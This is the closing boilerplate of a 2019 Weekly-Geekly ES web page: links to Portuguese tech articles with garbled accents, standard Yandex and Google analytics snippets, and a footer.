<li><a href="../pt432082/index.html">Microsoft AI Chatbot lan√ßa cole√ß√£o de roupas na China</a></li>
<li><a href="../pt432084/index.html">Como organizamos uma competi√ß√£o por turnos entre trabalhadores da produ√ß√£o (como na URSS)</a></li>
<li><a href="../pt432086/index.html">Impress√£o 3D na escola internacional com o nome de M.V. Lomonosov</a></li>
<li><a href="../pt432088/index.html">Alta disponibilidade do MySQL no GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>